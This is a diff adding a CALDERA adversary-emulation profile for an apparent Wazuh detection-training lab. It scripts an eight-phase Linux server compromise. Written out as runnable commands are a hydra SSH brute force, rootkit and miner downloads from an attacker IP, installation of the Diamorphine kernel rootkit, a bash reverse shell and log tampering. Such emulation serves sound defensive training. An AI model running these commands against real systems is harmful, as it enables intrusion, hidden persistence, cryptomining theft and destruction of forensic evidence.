@@ -1,0 +1,104 @@
+# ============================================
+# WazuhBOTS — CALDERA Adversary Profile
+# Scenario 3: Operation Ghost in the Shell
+# Linux Server Compromise + Rootkit
+# ============================================
+
+id: wazuhbots-ghost-shell
+name: "Operation Ghost in the Shell"
+description: |
+  Simulates an SSH brute force attack leading to full server compromise,
+  rootkit installation, C2 establishment, and cryptominer deployment.
+
+atomic_ordering:
+  # Phase 1: SSH Brute Force
+  - technique: T1110.001
+    name: "Brute Force: Password Guessing"
+    description: "SSH brute force attack against lnx-srv"
+    commands:
+      - "hydra -l sysadmin -P /opt/wordlists/common_passwords.txt ssh://lnx-srv -t 4 -w 2 -f"
+    notes: "Will generate thousands of failed login attempts in Wazuh"
+    delay_seconds: 120
+
+  # Phase 2: Valid Credentials Access
+  - technique: T1078
+    name: "Valid Accounts"
+    description: "Login with compromised credentials"
+    commands:
+      - "sshpass -p 'Summer2026!' ssh -o StrictHostKeyChecking=no sysadmin@lnx-srv 'echo access_granted'"
+    delay_seconds: 10
+
+  # Phase 3: Host Discovery
+  - technique: T1082
+    name: "System Information Discovery"
+    description: "Enumerate the compromised host"
+    commands:
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'id; whoami; uname -a; cat /etc/os-release; ip a; ps aux; netstat -tlnp 2>/dev/null'"
+    delay_seconds: 15
+
+  # Phase 4: Download Malicious Toolkit
+  - technique: T1105
+    name: "Ingress Tool Transfer"
+    description: "Download attacker toolkit"
+    commands:
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'wget -q http://172.25.0.100:8080/toolkit/rk_loader.sh -O /tmp/.rk_loader.sh && chmod +x /tmp/.rk_loader.sh'"
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'curl -s http://172.25.0.100:8080/toolkit/diamorphine.ko -o /tmp/.diamorphine.ko'"
+    delay_seconds: 20
+
+  # Phase 5: Rootkit Installation
+  - technique: T1014
+    name: "Rootkit"
+    description: "Install kernel module rootkit (Diamorphine)"
+    commands:
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'echo Summer2026! | sudo -S insmod /tmp/.diamorphine.ko'"
+    notes: "Diamorphine rootkit - can hide processes, files, and grant root"
+    delay_seconds: 15
+
+  # Phase 6: Establish C2 Channel
+  - technique: T1571
+    name: "Non-Standard Port"
+    description: "Establish reverse shell C2"
+    commands:
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'nohup bash -c \"bash -i >& /dev/tcp/172.25.0.100/4443 0>&1\" &>/dev/null &'"
+    delay_seconds: 10
+
+  # Phase 7: Deploy Cryptominer
+  - technique: T1496
+    name: "Resource Hijacking"
+    description: "Deploy XMRig cryptominer"
+    commands:
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'wget -q http://172.25.0.100:8080/toolkit/xmrig -O /tmp/.cache_update && chmod +x /tmp/.cache_update && nohup /tmp/.cache_update --url=pool.minexmr.com:4444 --user=attacker_wallet &>/dev/null &'"
+    delay_seconds: 30
+
+  # Phase 8: Log Tampering / Anti-Forensics
+  - technique: T1070.002
+    name: "Indicator Removal: Clear Linux or Mac System Logs"
+    description: "Attempt to cover tracks by tampering with logs"
+    commands:
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'echo Summer2026! | sudo -S truncate -s 0 /var/log/auth.log.1'"
+      - "sshpass -p 'Summer2026!' ssh sysadmin@lnx-srv 'echo Summer2026! | sudo -S touch -t 202603010000 /var/log/auth.log'"
+    notes: "Timestomping attempt - mtime vs ctime discrepancy detectable by Wazuh FIM"
+    delay_seconds: 10
+
+target_hosts:
+  - hostname: lnx-srv
+    ip: 172.25.0.31
+
+mitre_coverage:
+  tactics:
+    - Credential Access
+    - Initial Access
+    - Discovery
+    - Command and Control
+    - Execution
+    - Defense Evasion
+    - Impact
+  techniques:
+    - T1110.001
+    - T1078
+    - T1082
+    - T1105
+    - T1014
+    - T1571
+    - T1496
+    - T1070.002
